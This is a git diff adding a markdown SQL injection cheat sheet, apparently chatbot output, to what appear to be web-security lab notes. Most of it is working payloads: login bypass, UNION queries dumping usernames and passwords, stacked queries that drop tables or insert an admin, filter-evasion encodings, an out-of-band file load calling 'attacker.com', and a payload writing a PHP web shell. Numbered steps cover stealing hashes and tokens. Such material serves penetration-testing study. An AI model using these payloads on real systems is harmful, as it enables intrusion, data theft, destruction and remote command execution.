@@ -1,3 +1,222 @@
+# ✅ **SQL Injection – Complete Test Case (with Bypass Cases)**
+---
+
+## **1. List of Vulnerabilities**
+
+These vulnerabilities occur when SQL queries are built insecurely from user-controlled input:
+
+### **1.1 Boolean-Based SQL Injection**
+
+Injecting boolean operators (`OR 1=1`) to bypass authentication or extract data.
+
+### **1.2 Union-Based SQL Injection**
+
+Appending additional queries using `UNION SELECT` to extract database records.
+
+### **1.3 Error-Based SQL Injection**
+
+Triggering SQL errors to leak database structure or sensitive info.
+
+### **1.4 Blind SQL Injection (Time-Based)**
+
+Using time delays (`SLEEP()`, `WAITFOR DELAY`) to infer true/false conditions.
+
+### **1.5 Stacked Queries Injection**
+
+Executing multiple SQL statements (`; DROP TABLE users;`).
+
+### **1.6 Out-of-Band SQL Injection**
+
+Exfiltrating data via DNS or HTTP callbacks (`LOAD_FILE()`, `xp_dirtree`).
+
+### **1.7 WAF/Filter Bypass SQL Injection**
+
+Using comment truncation, case switching, encodings, or whitespace variations.
+
+### **1.8 Second-Order SQL Injection**
+
+Injected value stored and later executed by backend logic.
+
+### **1.9 Type Confusion SQL Injection**
+
+Passing numbers vs strings to trick backend into unsafe query paths.
+
+### **1.10 No-Filter Numeric Injection**
+
+Injecting raw numbers into numeric fields to manipulate logic.
+
+---
+
+## **2. Sample Payloads (Core Attack Payloads)**
+
+### **2.1 Authentication Bypass**
+
+```
+' OR 1=1 --
+' OR '1'='1
+admin' --
+admin' #
+```
+
+### **2.2 Union-Based Extraction**
+
+```
+' UNION SELECT NULL, NULL --
+' UNION SELECT username, password FROM users --
+```
+
+### **2.3 Get Database Version**
+
+```
+' UNION SELECT @@version, NULL --
+```
+
+### **2.4 Error-Based Enumeration**
+
+```
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y) --
+```
+
+### **2.5 Time-Based Blind**
+
+```
+' AND SLEEP(5) --
+' WAITFOR DELAY '0:0:5' --
+```
+
+### **2.6 Stacked Queries**
+
+```
+'; DROP TABLE users; --
+'; INSERT INTO admin VALUES ('hacked', 'pass'); --
+```
+
+### **2.7 Out-of-Band (OOB) Data Exfiltration**
+
+```
+LOAD_FILE('\\\\attacker.com\\abc')
+```
+
+---
+
+## **3. Bypass Payloads (WAF / Filter Evasion)**
+
+### **3.1 Case Switching**
+
+```
+' Or 1=1 --
+' oR '1'='1
+```
+
+### **3.2 Using Comments**
+
+```
+'/**/OR/**/1=1/**/
+admin'/**/--
+```
+
+### **3.3 URL Encoding**
+
+```
+%27%20or%201=1--
+```
+
+### **3.4 Double Encoding**
+
+```
+%2527%2520OR%25201%253D1--
+```
+
+### **3.5 Using Whitespace Variants**
+
+```
+' OR/**/1=1--
+' OR%09%091=1--
+```
+
+### **3.6 Replacing Keywords**
+
+```
+' UNI/**/ON SEL/**/ECT NULL,NULL --
+```
+
+### **3.7 Using CHAR() Injection**
+
+```
+' UNION SELECT CHAR(117,115,101,114), CHAR(112,97,115,115) --
+```
+
+---
+
+## **4. Complete Test Steps**
+
+### **4.1 Identify injectable fields**
+
+* Test with `'`
+* Look for SQL errors
+* Test with time-based: `SLEEP(3)`
+
+### **4.2 Confirm injection type**
+
+* Try `OR 1=1`
+* Try `UNION SELECT NULL,NULL`
+
+### **4.3 Perform database enumeration**
+
+* Extract number of columns
+* Extract database name, version, tables
+
+### **4.4 Extract sensitive data**
+
+* Users
+* Password hashes
+* Emails, tokens
+
+### **4.5 Attempt privilege escalation**
+
+* Modify queries to access admin panels
+
+### **4.6 Attempt WAF bypass**
+
+* Use encoded payloads
+* Use comments, case-changing, whitespace
+
+---
+
+## **5. Advanced Payloads**
+
+### **5.1 Extract all table names**
+
+```
+' UNION SELECT table_name, NULL FROM information_schema.tables --
+```
+
+### **5.2 Extract admin credentials**
+
+```
+' UNION SELECT username, password FROM admin --
+```
+
+### **5.3 Dump entire database (MySQL leak payload)**
+
+```
+' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT database()),0x7e)) --
+```
+
+### **5.4 Write web shell (if FILE privilege enabled)**
+
+```
+'; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"; --
+```
+
+---
+
+If you want, I can also generate:
+
+✅ PostgreSQL-specific
+✅ Oracle-specific
+✅ MSSQL-specific
+
 01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 ================================================================================
 
@@ -1219,3 +1438,4 @@ GET /filter?category=Accessories'+union+select+0,@@version;# HTTP/2
 ``` 
 
 ![img](images/4%20-%20SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/1.png)
+
